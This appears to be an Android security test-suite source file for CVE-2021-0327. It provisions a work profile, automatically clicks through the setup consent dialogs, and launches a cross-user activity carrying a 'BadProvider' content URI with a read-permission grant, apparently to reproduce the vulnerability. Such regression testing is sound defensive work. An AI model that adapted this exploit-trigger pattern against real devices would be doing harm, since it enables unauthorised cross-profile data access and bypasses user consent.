package android.security.cts.CVE_2021_0327;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.util.Log;
import android.os.SystemClock;

//import android.support.test.InstrumentationRegistry;
import androidx.test.InstrumentationRegistry;
import android.support.test.uiautomator.UiDevice;
import android.support.test.uiautomator.UiObject2;
import android.support.test.uiautomator.By;
import android.support.test.uiautomator.BySelector;
import java.io.*;
import java.util.stream.Collectors;

import android.security.cts.CVE_2021_0327.workprofilesetup.AdminReceiver;

public class IntroActivity extends Activity {

    private static final int AR_WORK_PROFILE_SETUP = 1;
    private static final String TAG = "CVE_2021_0327";

    private void launchOtherUserActivity() {
        Log.d(TAG,"launchOtherUserActivity()");
        Intent intent = new Intent(this, OtherUserActivity.class);
        intent.setClipData(new ClipData("d", new String[]{"a/b"}, new ClipData.Item(Uri.parse("content://android.security.cts.CVE_2021_0327.BadProvider"))));
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(intent);
        finish();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG,"IntroActivity.OnCreate()");
        if (isProfileOwner()) {
        } else if (canLaunchOtherUserActivity()) {
            launchOtherUserActivity();
        } else {
            setupWorkProfile(null);

            //detect buttons to click
            boolean profileSetUp=false;
            String button;
            java.util.List<UiObject2> objects;
            UiDevice mUiDevice = UiDevice.getInstance(InstrumentationRegistry.getInstrumentation());
            BySelector selector = By.clickable(true);


            while(!profileSetUp){
              do {
                Log.i(TAG, "waiting for clickable");
                SystemClock.sleep(3000);
              } while((objects = mUiDevice.findObjects(selector)).size()==0);
              for(UiObject2 o : objects){
                button=o.getText();
                Log.d(TAG,"button:" + button);

                if(button==null){
                  continue;
                }

                switch(button){
                  case "Delete" :
                    o.click();
                    Log.i(TAG, "clicked: Delete");
                    break;
                  case "Accept & continue" :
                    o.click();
                    Log.i(TAG, "clicked: Accept & continue");
                    break;
                  case "Next" :
                    o.click();
                    profileSetUp=true;
                    Log.i(TAG, "clicked: Next");
                    break;
                  default :
                    continue;
                }
                break;
              }
            }
            //end while(!profileSetUp);
        }
    }

    private boolean isProfileOwner() {
        return getSystemService(DevicePolicyManager.class).isProfileOwnerApp(getPackageName());
    }

    private boolean canLaunchOtherUserActivity() {
        Intent intent = new Intent("android.security.cts.CVE_2021_0327.OTHER_USER_ACTIVITY");
        return (getPackageManager().resolveActivity(intent, 0) != null);
    }

    public void setupWorkProfile(View view) {
        Log.d(TAG, "setupWorkProfile()");
        Intent intent = new Intent(DevicePolicyManager.ACTION_PROVISION_MANAGED_PROFILE);
        intent.putExtra(
                DevicePolicyManager.EXTRA_PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME,
                new ComponentName(this, AdminReceiver.class)
        );
        startActivityForResult(intent, AR_WORK_PROFILE_SETUP);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        Log.d(TAG, "onActivityResult()");
        if (requestCode == AR_WORK_PROFILE_SETUP) {
            if (resultCode == RESULT_OK) {
                launchOtherUserActivity();
            } else {
                new AlertDialog.Builder(this)
                        .setMessage("Work profile setup failed")
                        .setPositiveButton("ok", null)
                        .show();
            }
        }
        super.onActivityResult(requestCode, resultCode, data);
    }
}
